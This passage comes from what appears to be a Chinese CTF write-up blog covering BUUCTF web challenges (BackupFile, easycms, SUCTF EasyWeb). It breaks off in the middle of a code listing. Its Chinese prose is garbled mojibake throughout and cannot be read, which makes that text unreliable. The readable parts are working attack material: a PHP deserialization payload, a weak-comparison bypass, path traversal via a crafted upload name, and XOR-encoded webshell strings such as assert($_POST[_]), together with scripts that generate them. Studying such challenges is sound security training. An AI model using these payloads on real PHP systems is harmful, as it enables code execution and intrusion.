è‹¥æœä¸å†™ åœ¨æˆ‘ä»¬å¤åˆ¶çš„æ—¶å€™å°±ä¼šå‡å°‘ ç©ºæ ¼<br>æœ€ç»ˆpayloadï¼š<code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>å°è¯•ç®€å•åœ°è®¿é—®ä¸‹å¸¸è§å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°ä¸è¡Œï¼Œæ¥ç€ç”¨dirsearchæ‰«æï¼Œå‘ç°ï¼š&#x2F;index.php.bak å­˜åœ¨ï¼Œè®¿é—®ä¸‹è½½ï¼Œä¿®æ”¹åç¼€åæŸ¥çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿå¼±ç±»å‹æ¯”è¾ƒï¼Œ&#x3D; &#x3D; ä¸ºå¼±ç›¸ç­‰ï¼Œå³å½“æ•´æ•°å’Œå­—ç¬¦ä¸²ç±»å‹ç›¸æ¯”è¾ƒæ—¶ã€‚ä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•°ç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚æ¯”å¦‚a&#x3D;123å’Œb&#x3D;123admin456è¿›è¡Œ&#x3D; &#x3D;æ¯”è¾ƒæ—¶ã€‚åˆ™båªä¼šæˆªå–å‰é¢çš„æ•´æ•°éƒ¨åˆ†ã€‚å³bè½¬åŒ–æˆ123ã€‚<br>ç›´æ¥ç”¨ å‚æ•°?key&#x3D;123 å°±å¯ä»¥äº†</p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>æç¤ºäº†åå°å¼±å£ä»¤ï¼Œç›´æ¥admin&#x2F;12345ç™»é™†åå°ï¼Œå®¡è®¡åå°å‘ç°æœ‰ä»¥ä¸‹æ¼æ´</p><p>ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼šè®¾è®¡â€”â€”è‡ªå®šä¹‰â€”â€”å¯¼å‡ºä¸»é¢˜â€”â€”ä¿å­˜<br>æœ€åæ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œè§£å¯†åæ˜¯&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;12.zipè€Œä¸”æ˜¯æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬ç›´æ¥åŒ…å«&#x2F;flagå°±å¯ä»¥äº†ï¼Œbase64åŠ å¯†ä¸€ä¸‹æˆä¸ºL2ZsYWc&#x3D;<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image.png"></p><p>ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼šè®¾è®¡â€”â€”è‡ªå®šä¹‰â€”â€”é¦–é¡µâ€”â€”ç¼–è¾‘ï¼Œé€‰æ‹©phpæºä»£ç <br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-1.png"><br>ä¿å­˜æ—¶éœ€è¦é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶éªŒè¯ç®¡ç†å‘˜æƒé™<br>è¿™é‡Œé…åˆä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´å®ç°ï¼Œè®¾è®¡â€”â€”ç»„ä»¶â€”â€”ç´ æåº“â€”â€”ä¸Šä¼ ç´ æ:<code>../../../../../system/tmp/nkgq</code>,ä¿®æ”¹æ–‡ä»¶åç§°<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-2.png"><br>å¥‡æ€ªäº† æˆ‘è¿™è¾¹ä¸€ç›´å°è¯•ä¸æˆåŠŸ</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µPHPä»£ç ä¸»è¦æ¶‰åŠæ–‡ä»¶ä¸Šä¼ å’Œä»£ç æ‰§è¡Œï¼Œé€šè¿‡é™åˆ¶æŸäº›ç‰¹å¾æ¥é˜²æ­¢æ¶æ„è¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†åˆ†æï¼š</p><ol><li><code>get_the_flag</code>å‡½æ•°<br>è¯¥å‡½æ•°è´Ÿè´£å¤„ç†æ–‡ä»¶ä¸Šä¼ ï¼ŒåŒ…å«ä¸€ç³»åˆ—å®‰å…¨æ£€æŸ¥æ­¥éª¤ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><code>userdir</code>çš„å®šä¹‰åŸºäºç”¨æˆ·çš„IPåœ°å€ï¼ˆé€šè¿‡<code>md5</code>åŠ å¯†ï¼‰ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ä¸Šä¼ ç›®å½•ã€‚</li><li>å¦‚æœè¯¥ç›®å½•ä¸å­˜åœ¨ï¼Œä»£ç ä¼šé€šè¿‡<code>mkdir</code>åˆ›å»ºæ­¤ç›®å½•ã€‚è¿™ä½¿å¾—ä¸åŒç”¨æˆ·çš„ä¸Šä¼ å†…å®¹è¢«éš”ç¦»ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ï¼ˆ<code>$_FILES[&quot;file&quot;]</code>ä¸ä¸ºç©ºï¼‰ã€‚</li><li>è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼ˆ<code>tmp_name</code>ï¼‰å’Œæ–‡ä»¶åç§°ï¼ˆ<code>name</code>ï¼‰ã€‚</li><li>æå–æ–‡ä»¶æ‰©å±•åã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥æ‰©å±•åï¼Œç¦æ­¢åŒ…å«â€œphâ€ï¼ˆä¾‹å¦‚<code>.php</code>ï¼‰ï¼Œé˜²æ­¢ç”¨æˆ·ä¸Šä¼ PHPæ–‡ä»¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«PHPä»£ç ç¬¦å·<code>&lt;?</code>ï¼Œé˜²æ­¢ç”¨æˆ·ä¸Šä¼ åŒ…å«PHPä»£ç çš„æ–‡ä»¶ç»•è¿‡æ‰©å±•åæ£€æŸ¥ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨<code>exif_imagetype</code>éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆçš„å›¾ç‰‡ã€‚è¯¥å‡½æ•°ä¼šè¯»å–æ–‡ä»¶çš„Exifä¿¡æ¯ï¼Œä»¥ç¡®å®šæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºå¸¸è§å›¾ç‰‡æ ¼å¼ï¼ˆå¦‚JPEGã€PNGç­‰ï¼‰ï¼Œæœ‰æ•ˆåœ°é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœé€šè¿‡äº†æ‰€æœ‰éªŒè¯ï¼Œå°†æ–‡ä»¶ç§»åŠ¨åˆ°ç”¨æˆ·ç›®å½•ä¸‹çš„æŒ‡å®šè·¯å¾„ä¸­ï¼Œå¹¶è¾“å‡ºè·¯å¾„ã€‚</li></ul><ol start="2"><li>æ–‡ä»¶å†…å®¹å±•ç¤ºåŠé™åˆ¶<br>ä»¥ä¸‹ä»£ç è´Ÿè´£é™åˆ¶ä¼ é€’åˆ°<code>$_GET[&#39;_&#39;]</code>å‚æ•°çš„å†…å®¹åŠå­—ç¬¦ç±»å‹ï¼Œå¹¶é€šè¿‡<code>eval</code>æ‰§è¡Œä¼ å…¥çš„ä»£ç ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ<code>$_GET[&#39;_&#39;]</code>ä¸ºç©ºï¼Œåˆ™ä¼šæ˜¾ç¤ºå½“å‰æ–‡ä»¶æºä»£ç å†…å®¹ï¼ˆæ–¹ä¾¿è°ƒè¯•å’Œå®‰å…¨åˆ†æï¼‰ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é™åˆ¶<code>$hhh</code>çš„é•¿åº¦ä¸èƒ½è¶…è¿‡18ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ç»ˆæ­¢æ‰§è¡Œã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…<code>$hhh</code>ä¸­çš„å­—ç¬¦ï¼Œä¸å…è®¸<code>$hhh</code>åŒ…å«æ•°å­—ã€å­—æ¯å’Œéƒ¨åˆ†å¸¸è§ç¬¦å·ï¼Œä»¥é˜²æ­¢å¸¸è§„ä»£ç æ³¨å…¥æ”»å‡»ã€‚è¿™ä¸€æ­£åˆ™è¡¨è¾¾å¼é™åˆ¶æä¸ºä¸¥æ ¼ï¼Œä½¿å¾—ä»£ç å†…å®¹éœ€è¦ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦æ¥ç»•è¿‡æ£€æµ‹ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>è®¡ç®—<code>$hhh</code>ä¸­å­—ç¬¦ç§ç±»çš„æ•°é‡ï¼Œè‹¥è¶…è¿‡12ç§å­—ç¬¦ï¼Œåˆ™æ‹’ç»æ‰§è¡Œï¼Œè¿›ä¸€æ­¥é™åˆ¶äº†ä¼ é€’ä»£ç çš„å¤æ‚æ€§ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br></pre></td></tr></table></figure><ul><li>æ‰§è¡Œä¼ å…¥çš„ä»£ç ã€‚è¿™æ˜¯ä¸€ä¸ªæ½œåœ¨çš„å®‰å…¨é£é™©ç‚¹ï¼Œä½†ç”±äºå‰é¢çš„å¤šå±‚éªŒè¯ï¼Œæ‰§è¡Œçš„ä»£ç å—åˆ°è¯¸å¤šé™åˆ¶ã€‚</li></ul><p><a href="https://fanygit.github.io/">https://fanygit.github.io/</a><br>åœ¨ctfä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬é‡åˆ°ä¸Šé¢è¿™ç§æ­£åˆ™ï¼Œä¸èƒ½ä¼ å…¥å­—æ¯å’Œæ•°å­—ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½æ‰§è¡Œwebshelläº†å‘¢ï¼Œå¹¶ä¸æ˜¯ï¼Œpç¥åœ¨ä»–çš„åšå®¢ä¸­è®°å½•äº†ä¸‰ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯å¼‚æˆ–ã€å–åã€è‡ªå¢ã€‚<br>å¦‚æœæˆ‘ä»¬è¦æ„é€  phpinfo POST GET system è¿™ç±»å…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ ä¸¤ä¸ªæ²¡æœ‰è¢«è¿‡æ»¤çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¾—åˆ°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æ„é€  phpinfo </span><br><span class="line">p:%FF^%8F</span><br><span class="line">o:%FF^%90</span><br><span class="line">n:%FF^%91</span><br><span class="line">i:%FF^%96</span><br><span class="line">h:%FF^%97</span><br><span class="line">f:%FF^%99</span><br><span class="line"></span><br><span class="line">$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); æˆåŠŸæ‰§è¡Œphpinfo();</span><br><span class="line"></span><br><span class="line">åœ¨php5 å¯ä»¥ç”¨assert å‡½æ•° php7 ä¸èƒ½</span><br><span class="line">php5 ä¸‹</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);// assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);//_POST</span><br><span class="line">$___=$$__; //$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_])</span><br><span class="line">POST _=phpinfo();</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = <span class="built_in">chr</span>(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>); <span class="comment">// dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        